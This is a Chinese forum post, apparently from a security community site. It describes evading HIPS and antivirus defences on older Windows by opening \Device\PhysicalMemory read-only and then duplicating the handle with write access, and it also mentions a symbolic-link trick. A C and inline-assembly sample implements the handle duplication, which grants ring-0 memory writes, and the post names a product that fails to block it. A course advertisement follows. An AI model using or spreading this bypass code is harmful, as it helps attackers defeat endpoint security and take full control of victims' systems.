
# [原创]突破HIPS的防御思路之duplicate physical memory

众所周知，WINDOWS 2000/XP/2003 SP0系统上，提供了一个`\Device\PhysicalMemory`的`Section`对象，可以直接操作物理内存对象。直接操作此对象映射的物理内存，可以操作RING0内存，达到无驱进入RING0的目的。

这已是很多年前就被用烂的技术了，大部分驱动防火墙、绝大部分HIPS软件、AntiVirus软件等都对此进行了防御。不过，老树也能开新花，我们来看看这个东东的新利用方法：

1. `CreateSymbolicLink`，这也是很古老的方法，很多安全软件也已经防御。因为一些安全软件只防御了`NtOpenSection`，并根据打开的对象名是否是`\Device\PhysicalMemory`来进行拦截，但是只要对`\Device\PhysicalMemory`创建符号链接，那么一样可以使用`NtOpenSection`打开。

2. `Duplicate`法，大部分目前的安全软件，都是拦截`\Device\PhysicalMemory`并判断`DesiredAccess`是否包含`SECTION_MAP_WRITE`（除了一些极端无聊的没人用的HIPS外，这种的完全可以无视），因为一些正常的软件，也需要打开`\Device\PhysicalMemory`进行物理内存读入（例如微软Wga~）。

但这就让攻击者有空可钻，攻击者可以先以`SECTION_MAP_READ`打开物理内存对象，再以`SECTION_MAP_WRITE`方式duplicate handle，这样就可以获取对物理内存的写权限，进行物理内存写入了。大部分安全软件都没有防御这种方式（例如瑞\*），这样，攻击者又重新获得了对于系统至高无上的权利~

示例代码：

```
UNICODE_STRING uniname ;
OBJECT_ATTRIBUTES oba ;

HMODULE hlib = LoadLibrary("ntdll.dll");
PVOID p = GetProcAddress(hlib , "ZwOpenSection");
uniname.Buffer = (PWSTR)phyname;
uniname.Length = sizeof(phyname) - sizeof(WCHAR);
uniname.MaximumLength = sizeof(uniname);
HANDLE handle ; 
LONG stat ;
InitializeObjectAttributes(&oba , &uniname , 0x40 , 0 , 0 );
__asm{
   lea eax , oba
   push eax
   push 4
   lea   eax , handle
   push eax
   call p
   mov stat , eax
}
printf("stat 1 %08x\n" , stat);
HANDLE xhandle ; 
BOOL bret = DuplicateHandle(GetCurrentProcess() , handle,GetCurrentProcess() , &xhandle , SECTION_MAP_WRITE | SECTION_MAP_READ , FALSE , DUPLICATE_CLOSE_SOURCE);
```

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)
